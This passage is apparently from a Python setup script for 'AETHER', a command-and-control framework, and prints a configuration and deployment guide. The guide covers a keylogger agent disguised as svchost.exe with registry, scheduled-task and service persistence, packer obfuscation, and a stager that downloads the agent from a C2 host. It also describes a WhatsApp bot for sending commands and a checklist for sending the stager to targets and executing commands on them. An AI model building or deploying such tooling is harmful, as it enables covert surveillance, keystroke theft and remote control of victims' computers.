┌─ 5. WHATSAPP BOT CONFIGURATION ───────────────────────────────────────────┐
│                                                                             │
│ Files: server/comms/whatsapp_config.py                                   │
│        config.json (section: "whatsapp")                                  │
│                                                                             │
│ Setup Steps:                                                             │
│   1. Install Node.js dependencies:                                      │
│      cd WA-BOT-Base && npm install                                     │
│                                                                             │
│   2. Start Baileys bot:                                                 │
│      npm start                                                          │
│      → Scan QR code with WhatsApp                                      │
│                                                                             │
│   3. Start AETHER server:                                               │
│      python3 server/aether_server.py                                   │
│                                                                             │
│   4. Enable WhatsApp in AETHER:                                         │
│      AETHER> whatsapp enable                                           │
│                                                                             │
│   5. Add authorized users:                                              │
│      AETHER> whatsapp authorize +1234567890                           │
│                                                                             │
│ WhatsApp Commands:                                                       │
│   • auth <password> - Authenticate                                      │
│   • sessions - List connected agents                                    │
│   • link <session_id> - Select agent                                   │
│   • unlink - Disconnect from agent                                     │
│   • whoami - Current user info                                         │
│   • screenshot - Capture screen                                        │
│   • help - Show command help                                           │
│                                                                             │
│ Configuration Parameters:                                               │
│                                                                             │
│   In server/comms/whatsapp_config.py:                                  │
│                                                                             │
│   WHATSAPP_CONFIG = {                                                   │
│       'bot_url': 'http://localhost:3000',    # Baileys bot URL        │
│       'bot_api_key': 'your-key',             # Optional API key       │
│       'auth_password': 'aether2025',         # Change this!           │
│       'authorized_users': [                  # Whitelist numbers      │
│           # '+1234567890',                                            │
│       ],                                                               │
│       'enable_command_history': True,        # Log commands           │
│       'enable_session_linking': True,        # Link to agents         │
│       'max_message_length': 4096,            # WhatsApp limit         │
│       'command_timeout': 30,                 # Seconds                │
│   }                                                                    │
│                                                                             │
│ Security:                                                                │
│   ⚠️  Change auth_password to strong value                             │
│   ⚠️  Add only trusted numbers to authorized_users                     │
│   ⚠️  Use throwaway WhatsApp account                                   │
│   ⚠️  Monitor command history for suspicious activity                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ 6. COMPLETE CONFIGURATION EXAMPLE ────────────────────────────────────────┐
│                                                                             │
│ config.json (Full Example):                                              │
│                                                                             │
""" + json.dumps({
    "c2_host": "c2.example.com",
    "c2_port": 443,
    "encryption_key": "your-64-char-random-key-here",
    "c2": {
        "primary_host": "c2.example.com",
        "primary_port": 443,
        "protocol": "https"
    },
    "agent": {
        "name": "svchost",
        "persistence_methods": ["registry", "scheduled_task", "service"],
        "modules": {
            "keylogger": True,
            "screenshot": True,
            "webcam": False
        }
    },
    "builder": {
        "output_name": "svchost.exe",
        "use_pyarmor": True,
        "use_upx": True
    },
    "stager": {
        "config_url": "https://c2.example.com/config.json",
        "agent_url": "https://c2.example.com/agent.exe"
    },
    "whatsapp": {
        "bot_url": "http://localhost:3000",
        "auth_password": "change-me-123",
        "authorized_users": ["+1234567890"]
    }
}, indent=4) + """
│
│
└─────────────────────────────────────────────────────────────────────────┘

┌─ 7. DEPLOYMENT CHECKLIST ────────────────────────────────────────────────┐
│                                                                             │
│ Before Deployment:                                                       │
│   □ Encryption key changed from default                                 │
│   □ C2 host/port configured                                            │
│   □ Agent persistence methods enabled                                   │
│   □ Builder output name customized                                      │
│   □ Stager URLs point to accessible C2 server                          │
│   □ WhatsApp bot configured (optional)                                 │
│   □ All dependencies installed                                         │
│   □ Server starts without errors                                       │
│   □ Integration tests pass                                             │
│                                                                             │
│ During Deployment:                                                       │
│   □ C2 server running and listening                                    │
│   □ Agent executable deployed to targets                               │
│   □ Stager/agent URLs accessible from target network                   │
│   □ WhatsApp bot linked (if using)                                     │
│   □ Authorized users configured                                        │
│                                                                             │
│ After Deployment:                                                        │
│   □ Monitor agent beacons in C2 console                                │
│   □ Test command execution                                             │
│   □ Verify persistence mechanisms                                      │
│   □ Check WhatsApp command routing (if enabled)                        │
│   □ Monitor logs for errors                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ 8. QUICK START GUIDE ────────────────────────────────────────────────────┐
│                                                                             │
│ Step 1: Initial Setup                                                    │
│   python3 AETHER_SETUP.py                                              │
│   → Configure C2 Server [primary host/port]                            │
│   → Configure Agent [modules/persistence]                              │
│   → Install Dependencies [Python + Node.js]                            │
│                                                                             │
│ Step 2: Start Server                                                    │
│   Terminal 1: python3 server/aether_server.py                          │
│   → AETHER console should appear                                       │
│                                                                             │
│ Step 3: Build Agent (Optional)                                          │
│   python3 builder/compile.py                                           │
│   → Generates build_[timestamp]/dist/svchost.exe                      │
│                                                                             │
│ Step 4: Start WhatsApp Bot (Optional)                                   │
│   Terminal 2: cd WA-BOT-Base && npm start                             │
│   → Scan QR code with WhatsApp                                        │
│   → Go back to server console                                         │
│   → AETHER> whatsapp enable                                           │
│                                                                             │
│ Step 5: Deploy & Control                                               │
│   • Send stager.exe to targets                                         │
│   • Monitor console for new sessions                                   │
│   • Execute commands via AETHER console or WhatsApp                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘
        """
        
        print(guide)
        
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
    
    def run(self):
        """Main loop"""
        while True:
            choice = self.main_menu()
            
            if choice == '1':
                self.configure_c2_server()
            elif choice == '2':
                self.configure_agent()
            elif choice == '3':
                self.configure_builder()
            elif choice == '4':
                self.configure_stager()
            elif choice == '5':
                self.configure_whatsapp()
            elif choice == '6':
                self.install_dependencies()
            elif choice == '7':
                self.run_components()
            elif choice == '8':
                self.show_full_guide()
            elif choice == '9':
                self.validate_configurations()
                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            elif choice == '0':
                print(f"\n{Fore.CYAN}Exiting AETHER Setup{Style.RESET_ALL}")
                break


if __name__ == '__main__':
    setup = AetherSetup()
    setup.run()
